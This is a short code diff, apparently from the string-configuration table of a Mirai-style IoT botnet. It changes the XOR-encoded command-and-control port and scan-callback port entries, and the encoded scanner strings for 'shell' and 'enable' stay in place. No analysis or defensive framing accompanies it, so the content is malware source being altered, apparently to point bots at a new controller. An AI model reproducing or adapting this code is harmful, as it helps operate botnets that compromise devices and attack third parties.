@@ -16,8 +16,8 @@ struct table_value table[TABLE_MAX_KEYS];
 void table_init(void)
 {
 
-    add_entry(TABLE_CNC_PORT, "\xC3\xC3\xC3\xF5", 4); //6666
-    add_entry(TABLE_SCAN_CB_PORT, "\xC4\xCC\xCD\xC7\xF5", 5); //1982
+    add_entry(TABLE_CNC_PORT, "\xF7\x6F", 2); //666
+    add_entry(TABLE_SCAN_CB_PORT, "\xF2\x34", 2); //1982
     add_entry(TABLE_EXEC_SUCCESS, "\x1D\x3A\x32\x31\x37\x20\x31\x30\x74\x16\x2D\x74\x17\x21\x38\x20\x54", 17);
     add_entry(TABLE_SCAN_SHELL, "\x27\x3C\x31\x38\x38\x54", 6);
     add_entry(TABLE_SCAN_ENABLE, "\x31\x3A\x35\x36\x38\x31\x54", 7);
